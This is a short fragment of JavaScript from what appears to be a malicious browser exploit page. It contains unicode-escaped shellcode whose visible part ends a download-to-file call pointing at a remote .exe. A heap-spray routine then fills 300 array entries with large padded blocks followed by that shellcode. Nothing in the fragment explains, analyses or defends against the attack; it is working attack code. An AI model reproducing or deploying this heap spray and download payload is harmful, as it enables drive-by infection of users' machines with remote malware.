...
"%u6946%u656c%u0041%u7468%u7074%u2f3a%u772f%u712e%u6e71%u7465%u6e63%u632e%u2f6e%u3264%u652e%u6578%u8000");
...
while (bigblock["length"]< cuteqqoday2) bigblock+=bigblock;fillblock = bigblock.substring(0, cuteqqoday2);
block = bigblock.substring(0, bigblock["length"]-cuteqqoday2);
while(block.length+cuteqqoday2< 0x40000) block = block+block+fillblock;cuteqqsss = new window["Array"]();
cuteqqsave = cuteqqsss;
for (i=0; i< 300; i++) cuteqqsave[i] = block + Cuteqq_code;var chilam = '';
